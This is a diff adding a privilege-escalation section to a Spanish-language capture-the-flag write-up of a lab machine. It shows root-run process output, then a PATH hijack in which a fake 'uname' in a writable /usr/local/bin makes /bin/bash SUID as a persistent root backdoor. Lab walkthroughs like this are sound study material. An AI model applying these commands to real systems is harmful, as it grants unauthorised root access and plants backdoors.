@@ -55,3 +55,19 @@ python2.7 46635.py -u http://10.10.10.138
 La contraseña del CMS tambien vale para el SSH así que were in
 
 ## Privesc
+Podemos ver el siguiente proceso al inciar sesion mediante el pspy32
+```
+2020/08/26 15:04:52 CMD: UID=0    PID=2641   | run-parts --lsbsysinit /etc/update-motd.d 
+2020/08/26 15:04:52 CMD: UID=0    PID=2642   | uname -rnsom 
+```
+El segundo comando sale de la ejecucion de un archivo que hay /etc/update-motd.d, por otro lado podemos ver que podemos escribir en el primer elemento del PATH por parte del grupo staff
+```
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+```
+Podemos hacer lo siguiente:
+```
+jkr@writeup:/usr/local/bin$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /usr/local/bin/uname 
+jkr@writeup:/usr/local/bin$ chmod +x /usr/local/bin/uname
+```
+Nos logeamos ahora por SSH y ya tenemos nuestra backdoor con el SUID en bash
+
